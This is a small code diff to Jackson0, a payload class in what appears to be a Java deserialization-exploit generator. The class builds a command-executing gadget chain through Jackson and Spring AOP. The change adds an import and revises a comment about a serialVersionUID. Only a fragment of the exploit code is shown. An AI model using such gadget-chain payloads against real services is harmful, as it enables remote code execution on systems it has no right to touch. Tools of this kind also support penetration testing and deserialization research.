@@ -5,6 +5,7 @@ import com.h2tg.ysogate.annotation.Dependencies;
 import com.h2tg.ysogate.bullet.base.IReadObject2ToString;
 import com.h2tg.ysogate.bullet.jdk.GXString;
 import com.h2tg.ysogate.payloads.CommandObjectPayload;
+import com.h2tg.ysogate.utils.CtClassUtils;
 import com.h2tg.ysogate.utils.Gadgets;
 import com.h2tg.ysogate.utils.PayloadRunner;
 import com.h2tg.ysogate.utils.Reflections;
@@ -30,7 +31,7 @@ public class Jackson0 implements CommandObjectPayload<Object>
     }
 
     public Object getObject(final String command) throws Exception {
-        // aop 6 local class serialVersionUID = 273003553246259276
+        // spring-aop >= 5.3 DefaultAdvisorChainFactory local class serialVersionUID = 273003553246259276
 //        CtClassUtils.changeSerialVersionUID("org.springframework.aop.framework.DefaultAdvisorChainFactory", 273003553246259276L);
 
         CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
